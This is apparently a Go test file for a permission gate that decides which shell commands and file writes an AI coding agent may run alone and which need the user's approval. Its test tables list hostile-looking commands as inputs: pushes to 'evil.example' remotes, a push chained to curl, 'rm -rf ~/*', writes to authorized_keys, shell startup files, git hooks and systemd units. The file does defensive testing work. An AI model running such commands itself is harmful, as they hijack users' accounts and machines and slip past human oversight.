package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// fakeRepos has the remotes in remote and the changed setups in change, each by directory.
type fakeRepos struct {
	remote map[string][]string
	change map[string]string
}

func (f fakeRepos) remotes(dir string) []string { return f.remote[dir] }
func (f fakeRepos) changed(dir string) string   { return f.change[dir] }

const (
	home    = "/home/u"
	scratch = home + "/.local/state/bosun/nodes/a/tmp/claude-1000"
	memory  = home + "/.claude/projects/-repo/memory"
	job     = home + "/.claude/jobs/aaaaaaaa/tmp"
)

func testList(getenv func(string) string) userList {
	return newUserList(home, home+"/.claude", home+"/.local/state/bosun", getenv)
}

func noEnv(string) string { return "" }

func testGate() gate {
	return gate{cwd: "/wt", writable: []string{"/wt", scratch, memory, job}, list: testList(noEnv), repos: fakeRepos{
		remote: map[string][]string{"/wt": {"origin", "github"}, "/wt/sub": {"origin", "github"}, "/other": {"origin"}},
		change: map[string]string{"/other": "whose hook pre-push changed"},
	}}
}

var (
	none    = reservation{}
	force   = reservation{"a force push", true}
	deletes = reservation{"a push that deletes a ref", true}
	every   = reservation{"a push of every branch", true}
	mirror  = reservation{"a mirror push", true}
	unknown = reservation{"a push to a URL or an unknown remote", true}
	option  = reservation{"a push with an option bosun does not check", true}
	branch  = reservation{reason: "deleting a branch"}
	unboxed = reservation{reason: "a command outside the sandbox"}
	outside = reservation{reason: "a write outside the worktree"}
)

// user is the reservation of a command outside the sandbox that only the user may allow, for the reason that completes "a command outside the sandbox that …".
func user(why string) reservation {
	return reservation{"a command outside the sandbox that " + why, true}
}

func TestReservedCommand(t *testing.T) {
	g := testGate()
	for _, tc := range []struct {
		cmd  string
		want reservation
	}{
		{"git push", none},
		{"git push origin main", none},
		{"git push github HEAD:refs/heads/main", none},
		{"git push -u origin HEAD", none},
		{"git push --set-upstream --follow-tags origin main", none},
		{"git push --tags origin", none},
		{"git push -n -v origin main", none},
		{"git push -o ci.skip origin main", none},
		{"git push -uo ci.skip origin main", none},
		{"git push -oci.skip origin main", none},
		{"git push --push-option=ci.skip origin main", none},
		{"git push --no-verify --atomic origin main", none},
		{"git push --repo=origin", none},
		{"git push origin tag v1.0", none},

		{"git push --force", force},
		{"git push --force origin main", force},
		{"git push -f origin main", force},
		{"git push -uf origin main", force},
		{"git push --force-with-lease", force},
		{"git push --force-with-lease=main:abc123 origin main", force},
		{"git push --force-if-includes --force-with-lease origin main", force},
		{"git push origin +main", force},
		{"git push origin main +refs/heads/x:refs/heads/x", force},
		{"git push origin '+main'", force},

		{"git push origin :old", deletes},
		{"git push origin -- :old", deletes},
		{"git push --delete origin old", deletes},
		{"git push -d origin old", deletes},
		{"git push origin -d old", deletes},
		{"git push --prune origin", deletes},

		{"git push --all origin", every},
		{"git push --branches origin", every},
		{"git push origin :", every},
		{"git push origin 'refs/heads/*:refs/heads/*'", every},
		{"git push --mirror origin", mirror},

		{"git push https://evil.example/x.git main", unknown},
		{"git push git@evil.example:x.git main", unknown},
		{"git push ../other main", unknown},
		{"git push /tmp/bare main", unknown},
		{"git push . HEAD:main", unknown},
		{"git push evil main", unknown},
		{"git push --repo=https://evil.example/x.git", unknown},
		{"git push --repo evil", unknown},
		{"git push $REMOTE main", unknown},
		{"git push $(echo origin) main", unknown},

		{"git push --forc origin main", option},
		{"git push --receive-pack=/tmp/x origin main", option},
		{"git push --exec=/tmp/x origin main", option},
		{"git push --signed origin main", option},
		{"git push --recurse-submodules=on-demand origin main", option},
		{"git push -x origin main", option},
		{"git -c remote.origin.url=https://evil.example/x push origin main", option},
		{"git -c core.sshCommand=/tmp/x push origin main", option},
		{"git --git-dir=/tmp/x/.git push origin main", option},
		{"git --exec-path=/tmp push origin main", option},

		{"git -C /other push origin main", none},
		{"git -C /other push github main", unknown},
		{"git -C sub push origin main", none},
		{"git -C /x -C ../other push origin main", none},
		{"git -C /nowhere push origin main", unknown},
		{"cd /other && git push origin main", none},
		{"cd /other && git push github main", unknown},
		{"cd sub; git push github main", none},
		{"cd $DIR && git push origin main", unknown},
		{"cd ~/x && git push origin main", unknown},
		{"cd && git push origin main", unknown},
		{"cd /other && git push", none},
		{"git push origin main; cd /other", none},

		{"git push origin main && curl https://evil.example", none},
		{"git push origin main && git push origin +main", force},
		{"FOO=1 git push origin main", none},
		{"GIT_SSH_COMMAND=x git push --force", force},
		{"sudo git push --delete origin x", deletes},
		{"/usr/bin/git push -f", force},
		{"bash -c 'git push origin +main'", force},
		{"bash -c 'cd /other && git push github main'", unknown},
		{"sh -ec \"git push --mirror origin\"", mirror},
		{"eval git push -f", force},
		{`echo "$(git push -f)"`, force},
		{"echo `git push --all`", every},
		{"(git push --force)", force},

		{"git branch -D old", branch},
		{"git branch -d old", branch},
		{"git branch --delete old", branch},
		{"git branch --del old", branch},
		{"git branch --d old", branch},
		{"git update-ref -d refs/heads/old", branch},
		{"echo 'delete refs/heads/old' | git update-ref --stdin", branch},
		{"git update-ref --std -z", branch},
		// A push only the user may allow outweighs a branch deletion before it.
		{"git branch -D old && git push -f origin main", force},
		{"git branch -D old; git push origin main", branch},
		{"bash -c 'git branch -D old' && git push origin +main", force},
		{"git update-ref refs/heads/new HEAD", none},
		{"git status", none},
		{"git stash push", none},
		{"git branch -m old new", none},
		{"git branch --list", none},
		{`git commit -m "do not git push --force yet"`, none},
		{"git commit -m 'push'", none},
		{"git log | grep push", none},
		{"echo hi # git push --force", none},
		{"ls -la", none},
		// Inside the sandbox, a command's paths are the sandbox's to bind.
		{"echo x >> ~/.bashrc", none},
		{"sudo ls", none},
	} {
		if got := g.command(tc.cmd, []string{g.cwd}); got != tc.want {
			t.Errorf("command(%q) = %+v, want %+v", tc.cmd, got, tc.want)
		}
		input, _ := json.Marshal(map[string]any{"command": tc.cmd})
		if got := g.reserved("Bash", input); got != tc.want {
			t.Errorf("sandboxed %q: reserved = %+v, want %+v", tc.cmd, got, tc.want)
		}
	}
}

func TestReservedUnsandboxed(t *testing.T) {
	g := testGate()
	var (
		activates = user("activates a NixOS configuration")
		sudo      = user("runs sudo")
		changed   = reservation{"a push outside the sandbox from a repository whose hook pre-push changed", true}
	)
	for _, tc := range []struct {
		cmd  string
		want reservation
	}{
		// The allowlist leaves these to the normal flow.
		{"nxt", none},
		{"nxc", none},
		{"nixos-rebuild test --flake /etc/nixos", none},
		{"nixos-rebuild build --flake /etc/nixos", none},
		{"nixos-rebuild test --flake /etc/nixos#thinkpad", none},
		{"nixos-rebuild test --flake /etc/nixos/#thinkpad --sudo", none},
		{"nixos-rebuild --sudo test --flake=/etc/nixos#thinkpad", none},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/fix-bar", none},
		{"nixos-rebuild test --sudo --flake /etc/nixos/.claude/worktrees/fix-bar#thinkpad", none},
		{"nixos-rebuild build --flake=/etc/nixos/.claude/worktrees/b2/#x_1", none},
		{"git push", none},
		{"git push origin main", none},
		{"git push -u origin HEAD:refs/heads/x", none},
		{"git -C sub push origin main", none},

		// Activating a configuration runs it as root, and switch and boot add a boot entry.
		{"nxs", activates},
		{"nxb", activates},
		{"nxt --sudo", activates},
		{"nixos-rebuild switch --flake /etc/nixos", activates},
		{"nixos-rebuild boot --flake /etc/nixos#thinkpad", activates},
		{"nixos-rebuild test", activates},
		{"nixos-rebuild dry-activate --flake /etc/nixos", activates},
		{"nixos-rebuild test build --flake /etc/nixos", activates},
		{"nixos-rebuild test --flake /etc/nixos --flake /tmp/x", activates},
		{"nixos-rebuild test --sudo --sudo --flake /etc/nixos", activates},
		{"nixos-rebuild test --flake /etc/nixos --show-trace", activates},
		{"nixos-rebuild test --flake /etc/nixos --option allowed-uris x", activates},
		{"nixos-rebuild test --flake /home/egor/nixos", activates},
		{"nixos-rebuild test --flake /etc/nixos2", activates},
		{"nixos-rebuild test --flake path:/etc/nixos", activates},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/../../../tmp/x", activates},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/a/b", activates},
		{"nixos-rebuild test --flake /etc/nixos/sub", activates},
		{"nixos-rebuild test --flake /etc/nixos#$(id)", activates},
		{"nixos-rebuild test --flake $PWD", activates},
		{"nixos-rebuild test --flake '/etc/nixos'", activates},
		{"/run/current-system/sw/bin/nixos-rebuild test --flake /etc/nixos", activates},
		{"./nxt", activates},
		{"FOO=1 nxt", activates},
		{"PATH=/tmp nixos-rebuild test --flake /etc/nixos", activates},
		{"env nxt", activates},
		{"nxt; rm -rf /tmp/x", activates},
		{"nxt && nxs", activates},
		{"nxt | tee log", activates},
		{"nxt > log", activates},
		{"nxt 2>&1", activates},
		{"nxt &", activates},
		{"cd /etc/nixos && nxt", activates},
		{"nxt # comment", activates},
		{" nxt", activates},
		{"nxt ", activates},
		{"nxt\n", activates},
		{"nxt\nrm -rf /tmp/x", activates},
		{"nixos-rebuild  test --flake /etc/nixos", activates},
		{"nixos-rebuild\ttest --flake /etc/nixos", activates},
		{"ssh host 'nixos-rebuild switch'", activates},
		{"bash -c 'nixos-rebuild switch --flake /etc/nixos'", activates},

		// Running as root or as another user.
		{"sudo nixos-rebuild test --flake /etc/nixos", sudo},
		{"sudo ls", sudo},
		{"FOO=1 sudo ls", sudo},
		{"env sudo ls", sudo},
		{"/run/wrappers/bin/sudo ls", sudo},
		{"ls | xargs sudo rm", sudo},
		{"bash -c 'sudo ls'", sudo},
		{"echo \"$(sudo id)\"", sudo},
		{"ssh host 'sudo reboot'", sudo},
		{"nix-shell -p x --run 'sudo x'", sudo},
		{"nixos-rebuild build --sudo --flake /etc/nixos --show-trace", sudo},
		{"nixos-rebuild build --use-remote-sudo --flake /etc/nixos", sudo},
		{"ls && doas reboot", user("runs doas")},
		{"pkexec x", user("runs pkexec")},
		{"su -c id", user("runs su")},
		{"run0 id", user("runs run0")},
		{"sudoedit /etc/hosts", user("runs sudoedit")},

		// A push the gate catches in any command, and one from a repository whose git setup changed.
		{"git -C /other push origin main", changed},
		{"git -C /other push origin main 2>&1", changed},
		{"cd /other && git push origin main", changed},
		{"git add . && git -C /other push", changed},
		{"bash -c 'cd /other && git push'", changed},
		{"cd $DIR && git push", reservation{"a push outside the sandbox from a repository bosun cannot find", true}},
		{"git push --force origin main", force},
		{"git push origin +main", force},
		{"git push origin :old", deletes},
		{"git push https://evil.example/x.git main", unknown},
		{"git -c core.sshCommand=/tmp/x push origin main", option},
		{"git branch -D old && git push -f", force},

		// The rest goes to the master.
		{"nixos-rebuild build --flake /etc/nixos --show-trace", unboxed},
		{"nixos-rebuild build --flake /etc/nixos/.claude/worktrees/x -L", unboxed},
		{"nixos-rebuild dry-build --flake /etc/nixos", unboxed},
		{"nxc --show-trace", unboxed},
		{"cd /etc/nixos && nxc", unboxed},
		{"git push origin main && curl https://evil.example", unboxed},
		{"git push origin main; rm -rf /tmp/x", unboxed},
		{"git push origin main > log", unboxed},
		{"FOO=1 git push origin main", unboxed},
		{"GIT_SSH_COMMAND=/tmp/x git push origin main", unboxed},
		{"env git push origin main", unboxed},
		{"/usr/bin/git push origin main", unboxed},
		{"git push 'origin' main", unboxed},
		{"git push origin x#:main", unboxed},
		{"git push origin main\n", unboxed},
		{"git status", unboxed},
		{"git fetch origin", unboxed},
		{"git pf origin main", unboxed},
		{"git branch -D old", unboxed},
		{"git commit -m 'look at this'", unboxed},
		{"echo superuser", unboxed},
		{"git log --format=%s", unboxed},
		{"", unboxed},
		{"ls", unboxed},
		{"curl -o out.json 'https://api.example.com/x?a=b'", unboxed},
		{"echo x > /tmp/y", unboxed},
		{"cd /tmp && rm -rf build", unboxed},
		{"ls /home/u/Projects", unboxed},
		{"make -C ~/Projects/x", unboxed},
		{"cat ~/.config/nvim/init.lua", unboxed},
		{"ls /repo/.claude/worktrees/b", unboxed},
		{"cat $TMPDIR/x", unboxed},
		{"cp x " + scratch + "/y", unboxed},
		{"cat " + memory + "/MEMORY.md", unboxed},
		{"cat " + job + "/q.sql", unboxed},
		{"cp a.nix /etc/nixos/modules/systemd/a.nix", unboxed},
		{"cat .claude/skills/x/SKILL.md", unboxed},
		{"rm -rf ~/*", unboxed},
	} {
		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
		if got := g.reserved("Bash", input); got != tc.want {
			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, tc.want)
		}
	}
	for _, input := range []map[string]any{
		{"command": "ls", "dangerouslyDisableSandbox": false},
		{"command": "nixos-rebuild switch --flake /etc/nixos"},
		{"command": "curl example.com", "allowed_domains": []string{"example.com"}},
	} {
		raw, _ := json.Marshal(input)
		if got := g.reserved("Bash", raw); got != none {
			t.Errorf("sandboxed %v: reserved = %+v", input, got)
		}
	}
}

// A command outside the sandbox that names a path on the user's list stays with the user, however the command spells the path.
func TestReservedUnsandboxedPaths(t *testing.T) {
	g := testGate()
	const (
		names  = "names "
		holder = "names a folder that holds "
	)
	for _, tc := range []struct{ cmd, why string }{
		{"echo x >> ~/.bashrc", names + shellStartup},
		{"echo x >> $HOME/.zshrc", names + shellStartup},
		{"echo x >> ${HOME}/.profile", names + shellStartup},
		{`echo x >> "$HOME"/'.bashrc'`, names + shellStartup},
		{"echo x >>~/.zshenv", names + shellStartup},
		{"echo x | tee -a /home/u/.bash_profile", names + shellStartup},
		{"cat ~/.{zshrc,bashrc}", names + shellStartup},
		{"cat ~/.bash*", names + shellStartup},
		{"cat ~/.zsh?nv", names + shellStartup},
		{"cd ~ && echo x >> .bashrc", holder + claudeConfig},
		{"cd /tmp; echo x >> ../home/u/.profile", names + shellStartup},
		{"echo x >> $ZDOTDIR/.zshrc", names + shellStartup},
		{"echo x >> ~root/.bashrc", names + shellStartup},
		{`python3 -c 'open("/home/u/.bashrc", "a").write("x")'`, names + shellStartup},
		{"cp ~/.config/fish/config.fish /tmp", names + shellStartup},
		{"cat > /home/u/.ssh/authorized_keys", names + credentials},
		{"cp k ~/.ssh/", names + credentials},
		{"ls ~/.ss?", names + credentials},
		{"ls ~/.[s]sh", names + credentials},
		{"cd ~/.ssh && cat id_ed25519", names + credentials},
		{"scp k host:~/.ssh/authorized_keys", names + credentials},
		{"cat ~/.config/gh/hosts.yml", names + credentials},
		{"tea login add --config ~/.config/tea/config.yml", names + credentials},
		{"gpg --homedir ~/.gnupg --import k", names + credentials},
		{"echo x > ~/.claude/settings.json", names + claudeConfig},
		{"rm -rf $CLAUDE_CONFIG_DIR/skills/x", names + claudeConfig},
		{"vim ~/.claude.json", names + claudeConfig},
		{"cat > /repo/.claude/settings.json", names + claudeConfig},
		{"cp -r x /repo/.claude/skills/", names + claudeConfig},
		{"echo '{}' > /repo/.mcp.json", names + claudeConfig},
		{"echo x > .claude/settings.local.json", names + claudeConfig},
		{"cp hook.sh .claude/hooks/", names + claudeConfig},
		{"echo '{}' > .mcp.json", names + claudeConfig},
		{"bash -c 'cd ~/.claude && rm settings.json'", names + claudeConfig},
		{"cp hook.sh /repo/.git/hooks/pre-commit", names + gitConfig},
		{"echo x >> .git/config", names + gitConfig},
		{"echo 'gitdir: /tmp/x' > .git", names + gitConfig},
		{"cat /repo/.git/worktrees/a/config.worktree", names + gitConfig},
		{"git config --file ~/.gitconfig user.name x", names + gitConfig},
		{"cp x ~/.config/git/config", names + gitConfig},
		{"cp x.service ~/.config/systemd/user/", names + unitFile},
		{"cp x.service $XDG_CONFIG_HOME/systemd/user/", names + unitFile},
		{"cp x.service $CONF/systemd/user/", names + unitFile},
		{"cd ~/.config && rm -rf systemd", holder + credentials},
		{"cd $XDG_CONFIG_HOME/systemd && rm -rf user", names + unitFile},
		{"cd ~/.config/systemd; rm -rf *", names + unitFile},
		{"ln -s /tmp/x ~/.local/share/systemd/user/x.service", names + unitFile},
		{"cp x.desktop /home/u/.config/autostart/", names + unitFile},
		{"cp x.service /etc/systemd/system/", names + unitFile},
		{"rm -rf ~/.local/state/bosun/repos", names + bosunState},
		{"cat " + home + "/.local/state/bosun/nodes/a/settings.json", names + bosunState},
		{"cp x " + home + "/.local/state/bosun/nodes/a/tmp/x", names + bosunState},
		{"rm -rf ~/.config", holder + credentials},
		{"tar xf x.tar -C ~", holder + claudeConfig},
		{"cd && tar xf /tmp/x.tar", "runs in a folder that holds " + claudeConfig},
		{"ls /", holder + claudeConfig},
		{"cd / && ls", holder + claudeConfig},
		{"git push origin ~:main", holder + claudeConfig},
	} {
		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
		if got, want := g.reserved("Bash", input), user(tc.why); got != want {
			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, want)
		}
	}

	// A command that runs in a folder on the list stays with the user whatever it names.
	g.cwd = home + "/.ssh"
	input, _ := json.Marshal(map[string]any{"command": "rm id_ed25519", "dangerouslyDisableSandbox": true})
	if got, want := g.reserved("Bash", input), user("runs in "+credentials); got != want {
		t.Errorf("in %s: reserved = %+v, want %+v", g.cwd, got, want)
	}
}

// The list follows the XDG directories that the environment moves.
func TestUserListFollowsXDG(t *testing.T) {
	env := map[string]string{"XDG_CONFIG_HOME": "/cfg", "XDG_DATA_HOME": "/data"}
	g := testGate()
	g.list = testList(func(k string) string { return env[k] })
	for _, tc := range []struct{ cmd, why string }{
		{"cp x /cfg/systemd/user/x.service", unitFile},
		{"cp x $XDG_CONFIG_HOME/autostart/x.desktop", unitFile},
		{"cp x /data/keyrings/x", credentials},
		{"cp x ~/.config/systemd/user/x.service", unitFile},
	} {
		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
		if got, want := g.reserved("Bash", input), user("names "+tc.why); got != want {
			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, want)
		}
	}
}

// Every rebuild that leaves the sandbox must meet an ask rule, or auto mode would decide it without the master.
func TestRebuildsMeetAskRules(t *testing.T) {
	for _, cmd := range []string{"nxt", "nxc", "nixos-rebuild test --flake /etc/nixos", "nixos-rebuild --sudo build --flake=/etc/nixos#x"} {
		argv := strings.Split(cmd, " ")
		if !rebuild(argv) {
			t.Fatalf("%q is not on the allowlist", cmd)
		}
		if !slices.ContainsFunc(rebuildRules, func(rule string) bool {
			prefix, ok := strings.CutSuffix(strings.TrimSuffix(strings.TrimPrefix(rule, "Bash("), ")"), ":*")
			return cmd == prefix || ok && strings.HasPrefix(cmd, prefix+" ")
		}) {
			t.Errorf("no ask rule in %q matches %q", rebuildRules, cmd)
		}
	}
}

func TestReservedWrite(t *testing.T) {
	const wt = "/repo/.claude/worktrees/a"
	g := gate{cwd: wt, writable: []string{wt, scratch, memory, job}, list: testList(noEnv)}
	to := func(what string) reservation { return reservation{"a write to " + what, true} }
	for _, tc := range []struct {
		tool, path string
		want       reservation
	}{
		{"Write", wt + "/main.go", none},
		{"Edit", wt + "/sub/x.go", none},
		{"Write", "main.go", none},
		{"Read", "/etc/passwd", none},
		{"Write", memory + "/feedback.md", none},
		{"Edit", memory + "/MEMORY.md", none},
		{"Write", job + "/query.sql", none},
		{"Write", scratch + "/probe.sh", none},
		// Inside the worktree, only what the session's next start runs outside the sandbox stays with the user.
		{"Write", wt + "/.claude/skills/x/SKILL.md", none},
		{"Write", wt + "/.claude/agents/x.md", none},
		{"Write", wt + "/.bashrc", none},
		{"Write", wt + "/modules/systemd/user/x.nix", none},
		{"Write", wt + "/.claude/settings.json", to(claudeConfig)},
		{"Write", wt + "/.claude/settings.local.json", to(claudeConfig)},
		{"Write", wt + "/.claude/hooks/x.sh", to(claudeConfig)},
		{"Write", wt + "/.mcp.json", to(claudeConfig)},
		{"Write", wt + "/.git", to(gitConfig)},

		{"Write", "/tmp/cfgprobe.sh", outside},
		{"Write", "/repo/main.go", outside},
		{"Edit", wt + "/../b/x.go", outside},
		{"MultiEdit", "/etc/passwd", outside},
		{"Write", "/repo/.claude/worktrees/ab/x", outside},
		{"Write", "/etc/nixos/modules/x.nix", outside},
		{"Write", home + "/.config/nvim/init.lua", outside},
		{"Write", "../tmp/x", outside},

		{"Write", home + "/.bashrc", to(shellStartup)},
		{"Edit", home + "/.zshrc", to(shellStartup)},
		{"Write", home + "/.config/fish/config.fish", to(shellStartup)},
		{"Write", home + "/.config/environment.d/x.conf", to(shellStartup)},
		{"Write", home + "/.ssh/config", to(credentials)},
		{"Write", home + "/.ssh/authorized_keys", to(credentials)},
		{"Write", home + "/.gnupg/gpg.conf", to(credentials)},
		{"Write", home + "/.netrc", to(credentials)},
		{"Write", home + "/.config/gh/hosts.yml", to(credentials)},
		{"Write", home + "/.config/tea/config.yml", to(credentials)},
		{"Write", home + "/.local/share/keyrings/login.keyring", to(credentials)},
		{"Write", home + "/.claude/settings.json", to(claudeConfig)},
		{"Write", home + "/.claude/skills/x/SKILL.md", to(claudeConfig)},
		{"Write", home + "/.claude/CLAUDE.md", to(claudeConfig)},
		{"Write", home + "/.claude/projects/-other/memory/x.md", to(claudeConfig)},
		{"Write", home + "/.claude/jobs/aaaaaaaa/state.json", to(claudeConfig)},
		{"Write", home + "/.claude.json", to(claudeConfig)},
		{"Write", "/repo/.claude/settings.json", to(claudeConfig)},
		{"Write", "/repo/.claude/skills/x/SKILL.md", to(claudeConfig)},
		{"Write", "/repo/.claude/worktrees/b/.claude/settings.json", to(claudeConfig)},
		{"Write", "/repo/.mcp.json", to(claudeConfig)},
		{"Write", "/repo/.git/hooks/pre-push", to(gitConfig)},
		{"Write", "/repo/.git/config", to(gitConfig)},
		{"Write", "/repo/.git/worktrees/a/config.worktree", to(gitConfig)},
		{"Write", home + "/.gitconfig", to(gitConfig)},
		{"Write", home + "/.config/git/config", to(gitConfig)},
		{"Write", home + "/.config/systemd/user/x.service", to(unitFile)},
		{"Write", home + "/.local/share/systemd/user/x.timer", to(unitFile)},
		{"Write", home + "/.config/autostart/x.desktop", to(unitFile)},
		{"Write", "/etc/systemd/system/x.service", to(unitFile)},
		{"Write", "/etc/xdg/autostart/x.desktop", to(unitFile)},
		{"Write", home + "/.local/state/bosun/repos/-repo.json", to(bosunState)},
		{"Write", home + "/.local/state/bosun/nodes/a/settings.json", to(bosunState)},
		{"Write", home + "/.local/state/bosun/bosun", to(bosunState)},
	} {
		input, _ := json.Marshal(map[string]string{"file_path": tc.path})
		if got := g.reserved(tc.tool, input); got != tc.want {
			t.Errorf("%s %s: reserved = %+v, want %+v", tc.tool, tc.path, got, tc.want)
		}
	}
	input, _ := json.Marshal(map[string]string{"notebook_path": "/tmp/n.ipynb"})
	if got := g.reserved("NotebookEdit", input); got != outside {
		t.Errorf("NotebookEdit outside the worktree: reserved = %+v", got)
	}
}

// A file tool follows symlinks, so a write counts as one to where they lead.
func TestReservedWriteThroughSymlink(t *testing.T) {
	root := t.TempDir()
	wt, h := filepath.Join(root, "wt"), filepath.Join(root, "home")
	for _, dir := range []string{wt, h} {
		if err := os.Mkdir(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for link, target := range map[string]string{
		"rc":   filepath.Join(h, ".bashrc"),
		"keys": filepath.Join(h, ".ssh"),
		"up":   "../home",
		"tmp":  "/tmp",
		"self": "sub",
	} {
		if err := os.Symlink(target, filepath.Join(wt, link)); err != nil {
			t.Fatal(err)
		}
	}
	// The worktree itself may lie behind a link.
	via := filepath.Join(root, "via")
	if err := os.Symlink(wt, via); err != nil {
		t.Fatal(err)
	}
	g := gate{cwd: wt, writable: []string{wt}, list: newUserList(h, filepath.Join(h, ".claude"), filepath.Join(h, "state"), noEnv)}
	for _, tc := range []struct {
		path string
		want reservation
	}{
		{filepath.Join(wt, "rc"), reservation{"a write to " + shellStartup, true}},
		{filepath.Join(wt, "keys", "authorized_keys"), reservation{"a write to " + credentials, true}},
		{filepath.Join(wt, "up", ".profile"), reservation{"a write to " + shellStartup, true}},
		{filepath.Join(wt, "tmp", "x"), outside},
		{filepath.Join(wt, "self", "x.go"), none},
		{filepath.Join(wt, "x.go"), none},
	} {
		input, _ := json.Marshal(map[string]string{"file_path": tc.path})
		if got := g.reserved("Write", input); got != tc.want {
			t.Errorf("Write %s: reserved = %+v, want %+v", tc.path, got, tc.want)
		}
	}
	g.writable = []string{via}
	input, _ := json.Marshal(map[string]string{"file_path": filepath.Join(via, "x.go")})
	if got := g.reserved("Write", input); got != none {
		t.Errorf("Write in a worktree behind a link: reserved = %+v", got)
	}
}

func TestBraces(t *testing.T) {
	for _, tc := range []struct {
		in   string
		want []string
	}{
		{"x", []string{"x"}},
		{"~/.{bashrc,zshrc}", []string{"~/.bashrc", "~/.zshrc"}},
		{"{a,b}{c,d}", []string{"ac", "ad", "bc", "bd"}},
		{"{a,{b,c}}x", []string{"ax", "bx", "cx"}},
		{"${HOME}/x", []string{"${HOME}/x"}},
		{"{a}", []string{"{a}"}},
		{"{a,b", []string{"{a,b"}},
	} {
		if got := braces(tc.in, 256); !slices.Equal(got, tc.want) {
			t.Errorf("braces(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
	if got := braces(strings.Repeat("{a,b}", 20), 256); len(got) != 257 {
		t.Errorf("braces past the limit gave %d words", len(got))
	}
}
